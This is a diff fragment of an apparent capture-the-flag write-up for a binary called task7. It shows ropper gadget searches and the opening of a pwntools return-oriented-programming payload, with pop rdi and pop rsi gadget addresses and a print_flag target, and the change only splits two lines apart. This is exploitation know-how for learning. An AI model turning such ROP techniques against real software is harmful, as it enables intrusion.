@@ -28,7 +28,8 @@ using ropper, we can find the wanted gadgets :
 - ropper --file task7 --search "pop ret" #0x0000000000401321
 ## Payload
 ```python
-from pwn import *                                                                                                                                                                                                                               p = process("./task7")                                                                                                  
+from pwn import *
+p = process("./task7")                                                                                                  
 poprdi = 0x401323                                                                                                       
 poprsi = 0x401321                                                                                                       
 print_flag = 0x40121f                                                                                                   
